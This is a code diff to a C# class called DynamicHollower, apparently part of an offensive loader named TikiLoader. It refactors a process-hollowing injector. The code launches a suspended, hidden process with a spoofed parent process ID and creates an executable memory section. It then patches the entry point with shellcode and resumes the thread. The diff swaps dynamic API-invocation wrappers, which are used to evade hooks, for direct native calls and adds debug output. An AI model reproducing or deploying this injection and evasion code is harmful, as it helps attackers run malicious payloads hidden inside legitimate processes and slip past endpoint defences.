@@ -12,98 +12,7 @@ namespace TikiLoader
 {
     public class DynamicHollower
     {
-        public struct DELEGATES
-        {
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate void GetSystemInfo(
-                ref SYSTEM_INFO lpSysInfo
-            );
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr GetCurrentProcess();
-            
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate int ZwMapViewOfSection(
-                IntPtr section, 
-                IntPtr process, 
-                ref IntPtr baseAddr, 
-                IntPtr zeroBits,
-                IntPtr commitSize, 
-                IntPtr stuff, 
-                ref IntPtr viewSize, 
-                int inheritDispo, 
-                AllocationType alloctype, 
-                MemoryProtection prot);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate int ZwCreateSection(
-                ref IntPtr section,
-                uint desiredAccess,
-                IntPtr pAttrs,
-                ref LARGE_INTEGER pMaxSize,
-                MemoryProtection pageProt, 
-                AllocationType allocationAttribs,
-                IntPtr hFile);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate int ZwQueryInformationProcess(
-                IntPtr hProcess,
-                int procInformationClass,
-                ref PROCESS_BASIC_INFORMATION procInformation,
-                uint ProcInfoLen,
-                ref uint retlen);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool ReadProcessMemory(
-                IntPtr hProcess, 
-                IntPtr lpBaseAddress, 
-                [Out] byte[] lpBuffer,
-                int dwSize,
-                out IntPtr lpNumberOfBytesRead);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool WriteProcessMemory(
-                IntPtr hProcess, 
-                IntPtr lpBaseAddress,
-                IntPtr lpBuffer,
-                IntPtr nSize,
-                out IntPtr lpNumWritten);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate uint ResumeThread(
-                IntPtr hThread);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate int ZwUnmapViewOfSection(
-                IntPtr hSection,
-                IntPtr address);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool InitializeProcThreadAttributeList(
-                IntPtr lpAttributeList, 
-                int dwAttributeCount,
-                int dwFlags,
-                ref IntPtr lpSize);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool UpdateProcThreadAttribute(
-                IntPtr lpAttributeList,
-                uint dwFlags, 
-                IntPtr Attribute, 
-                IntPtr lpValue, 
-                IntPtr cbSize,
-                IntPtr lpPreviousValue, 
-                IntPtr lpReturnSize);
-
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool DeleteProcThreadAttributeList(
-               IntPtr lpAttributeList);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool CloseHandle(IntPtr handle);
-        }
-
+       
         private const int AttributeSize = 24;
         private const ulong PatchSize = 0x10;
 
@@ -119,154 +28,14 @@ namespace TikiLoader
         byte[] inner_;
 
 
-        /*
-       [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
-       public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
-       */
-         
-        public static void GetSystemInfo(ref SYSTEM_INFO lpSysInfo)
-        {
-            object[] funcargs = { lpSysInfo };
-            DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"GetSystemInfo", typeof(DELEGATES.GetSystemInfo), ref funcargs);
-        }
-
-        
-        public static IntPtr GetCurrentProcess()
-        {
-            object[] funcargs = { };
-            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"GetCurrentProcess", typeof(DELEGATES.GetCurrentProcess), ref funcargs);
-        }
-
-
-        public static int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, AllocationType alloctype, MemoryProtection prot)
-        {
-            object[] funcargs =
-            {
-                section,
-                process,
-                baseAddr,
-                zeroBits,
-                commitSize,
-                stuff,
-                viewSize,
-                inheritDispo,
-                alloctype,
-                prot
-            };
-
-            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwMapViewOfSection", typeof(DELEGATES.ZwMapViewOfSection), ref funcargs);
-        }
-
-        public static int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, MemoryProtection pageProt, AllocationType allocationAttribs, IntPtr hFile)
-        {
-            object[] funcargs =
-            {
-                section,
-                desiredAccess,
-                pAttrs,
-                pMaxSize,
-                pageProt,
-                allocationAttribs,
-                hFile
-            };
-            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwCreateSection", typeof(DELEGATES.ZwMapViewOfSection), ref funcargs);
-        }
-
       
-        public static int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen)
-        {
-            object[] funcargs =
-            {
-                hProcess,
-                procInformationClass,
-                procInformation,
-                ProcInfoLen,
-                retlen
-            };
-            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwQueryInformationProcess", typeof(DELEGATES.ZwQueryInformationProcess), ref funcargs);
-        }
-
-
-        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
-        {
-            lpNumberOfBytesRead = default;
-            object[] funcargs =
-            {
-                hProcess,
-                lpBaseAddress,
-                lpBuffer,
-                dwSize,
-                lpNumberOfBytesRead
-            };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ReadProcessMemory", typeof(DELEGATES.ReadProcessMemory), ref funcargs);
-        }
-
-        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten)
-        {
-            lpNumWritten = default;
-            object[] funcargs =
-            {
-                hProcess, 
-                lpBaseAddress,
-                lpBuffer,
-                nSize,
-                lpNumWritten
-            };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"WriteProcessMemory", typeof(DELEGATES.WriteProcessMemory), ref funcargs);
-        }
-
-
-
-        public static uint ResumeThread(IntPtr hThread)
-        {
-            object[] funcargs = { hThread };
-            return (uint)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ResumeThread", typeof(DELEGATES.ResumeThread), ref funcargs);
-        }
-
-        public static int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address)
-        {
-            object[] funcargs =
-            {
-                hSection,
-                address
-            };
-            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwUnmapViewOfSection", typeof(DELEGATES.ZwUnmapViewOfSection), ref funcargs);
-        }
-
-        public static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
-        {
-            object[] funcargs =
-            {
-                lpAttributeList,
-                dwFlags,
-                Attribute,
-                lpValue,
-                cbSize,
-                lpPreviousValue,
-                lpReturnSize
-            };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcargs);
-        }
-
-        public static bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
-        {
-            object[] funcargs = { lpAttributeList };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref funcargs);
-        }
-
-        public static bool CloseHandle(IntPtr handle)
-        {
-            object[] funcargs = { handle };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"CloseHandle", typeof(DELEGATES.CloseHandle), ref funcargs);
-        }
 
         public static uint round_to_page(uint size)
         {
             try
             {
                 SYSTEM_INFO info = new SYSTEM_INFO();
-                GetSystemInfo(ref info);
-                Console.WriteLine(info.dwPageSize);
+                Natives.GetSystemInfo(ref info);
                 return (info.dwPageSize - size % info.dwPageSize) + size;
             }
             catch(Exception e)
@@ -275,7 +44,7 @@ namespace TikiLoader
                 return (uint)0;
             }
         }
-
+        
         private bool nt_success(long v)
         {
             return (v >= 0);
@@ -283,7 +52,7 @@ namespace TikiLoader
        
         private IntPtr GetCurrent()
         {
-            return GetCurrentProcess();
+            return Natives.GetCurrentProcess();
         }
 
         private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemoryProtection protect, IntPtr addr)
@@ -291,7 +60,7 @@ namespace TikiLoader
             IntPtr baseAddr = addr;
             IntPtr viewSize = (IntPtr)size_;
 
-            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
+            var status = Natives.ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
             return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
         }
 
@@ -301,7 +70,7 @@ namespace TikiLoader
             size_ = round_to_page(size);
             liVal.LowPart = size_;
 
-            var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);
+            var status = Natives.ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);
 
             return nt_success(status);
         }
@@ -408,11 +177,12 @@ namespace TikiLoader
 
         private IntPtr FindEntry(IntPtr hProc)
         {
+            Console.WriteLine($"hProc: {hProc}");
             var basicInfo = new PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
 
-            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
-
+            var success = Natives.ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
+            Console.WriteLine($"Success: {success}");
             IntPtr readLoc = IntPtr.Zero;
             var addrBuf = new byte[IntPtr.Size];
             if (IntPtr.Size == 4)
@@ -426,16 +196,19 @@ namespace TikiLoader
 
             IntPtr nRead = IntPtr.Zero;
 
-            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);
-
+            Natives.ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);
+            Console.WriteLine("Readprocessmemory for first time");
+            Console.WriteLine($"addrbuf: {addrBuf.Length}");
             if (IntPtr.Size == 4)
                 readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
             else
                 readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
 
+            Console.WriteLine($"Readloc: {readLoc}");
             pModBase_ = readLoc;
-            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
-
+            Console.WriteLine("Read process memory for second time");
+            Natives.ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
+            Console.WriteLine($"left read process memory");
             return GetEntryFromBuffer(inner_);
         }
 
@@ -452,8 +225,9 @@ namespace TikiLoader
             {
                 var pSize = (IntPtr)patch.Key;
                 IntPtr tPtr = new IntPtr();
-
-                WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
+               
+                //TikiLoader.NativeSysCall.ZwWriteVirtualMemory10(pInfo.hProcess, ref pEntry_, patch.Value, (uint)patch.Key, ref remotesize_);
+                Natives.WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
             }
             finally
             {
@@ -464,8 +238,8 @@ namespace TikiLoader
             var tbuf = new byte[0x1000];
             var nRead = new IntPtr();
 
-            ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
-            var res = ResumeThread(pInfo.hThread);
+            Natives.ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
+            var res = Natives.ResumeThread(pInfo.hThread);
         }
 
         private IntPtr GetBuffer()
@@ -476,25 +250,9 @@ namespace TikiLoader
         ~DynamicHollower()
         {
             if (localmap_ != (IntPtr)0)
-                ZwUnmapViewOfSection(section_, localmap_);
+                Natives.ZwUnmapViewOfSection(section_, localmap_);
         }
 
-        public static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)
-        {
-            object[] funcargs =
-            {
-                lpAttributeList,
-                dwAttributeCount,
-                dwFlags,
-                lpSize
-            };
-
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcargs);
-        }
-
-
-        [DllImport("kernel32.dll")]
-        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
 
         public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
@@ -513,30 +271,33 @@ namespace TikiLoader
                 tSec.nLength = Marshal.SizeOf(tSec);
 
                 CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;
+                    
 
                 IntPtr lpSize = IntPtr.Zero;
 
-                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+                Natives.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                 sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
+                Natives.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
 
                 IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                 lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                 Marshal.WriteIntPtr(lpValue, parentHandle);
 
                 int ProcThreadAttributeParentProcess = 0x00020000;
-                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                Natives.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
 
-                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-
+                bool result = Natives.CreateProcessW(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, 134742028, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+                Console.WriteLine($"Result of CreateProcessW: {result}");
+                Console.WriteLine($"pInfo: {pInfo}");
                 return pInfo;
 
             }
             finally
             {
-                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
+                Natives.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                 Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                 Marshal.FreeHGlobal(lpValue);
+                Console.WriteLine("left finally");
             }
 
         }
@@ -566,6 +327,7 @@ namespace TikiLoader
         {
             try
             {
+
                 var pinf = StartProcess(binary, ppid);
                 Console.WriteLine("Started process");
                 FindEntry(pinf.hProcess);
@@ -578,14 +340,14 @@ namespace TikiLoader
                 Console.WriteLine("Copied shellcode");
                 MapAndStart(pinf);
                 Console.WriteLine("Mapped and started");
-                CloseHandle(pinf.hThread);
+                Natives.CloseHandle(pinf.hThread);
                 Console.WriteLine("Closed handle for pinf");
-                CloseHandle(pinf.hProcess);
+                Natives.CloseHandle(pinf.hProcess);
                 Console.WriteLine("closed handle hProcess");
             }
             catch(Exception e)
             {
-                Console.WriteLine($"an exception occurred changevirtualemoryr {e}");
+                Console.WriteLine($"an exception has occurred: {e}");
                 Debug.WriteLine(GetAllFootprints(e));
             }
         }
